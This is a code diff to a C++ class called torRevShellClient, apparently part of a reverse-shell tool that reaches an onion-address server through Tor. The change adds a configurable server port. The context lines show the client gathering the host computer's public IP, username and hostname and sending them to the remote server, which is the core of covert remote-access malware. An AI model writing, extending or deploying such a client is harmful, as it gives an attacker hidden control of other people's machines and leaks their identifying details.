@@ -22,6 +22,7 @@ private:
     torPlusPlus::torSocketExtended torSock;
     std::string torPath;
     std::string servAddr;
+    unsigned int servPort = 0;
     std::string publicIp;
     std::string username;
     std::string hostname;
@@ -97,9 +98,10 @@ public:
         servAddr: the onion address of the server to connect to.
         Calls this->getComputerInfo() to get the username, hostname, and public IP of this computer.
     */
-    torRevShellClient(std::string torPath, std::string servAddr){
+    torRevShellClient(std::string torPath, std::string servAddr, unsigned int servPort){
         this->torPath = torPath;
         this->servAddr = servAddr;
+        this->servPort = servPort;
         this->getComputerInfo();
     }
 
@@ -121,8 +123,8 @@ public:
     bool attemptConnect() {
         // Start the proxy and connect to the server
         this->torSock.connectToProxy(); // Connect to the proxy, so we can then connect to the server through it
-        printf("Attempting to connect to %s\n", this->servAddr.c_str());
-        this->torSock.connectProxyTo(this->servAddr.c_str());
+        printf("Attempting to connect to %s:%d\n", this->servAddr.c_str(), this->servPort);
+        this->torSock.connectProxyTo(this->servAddr.c_str(), this->servPort);
         
         // Assemble and send the connection request
         std::string connReq = this->publicIp + ";" + this->username + ";" + this->hostname + ";"; // Format: <ip>;<username>;<hostname>;
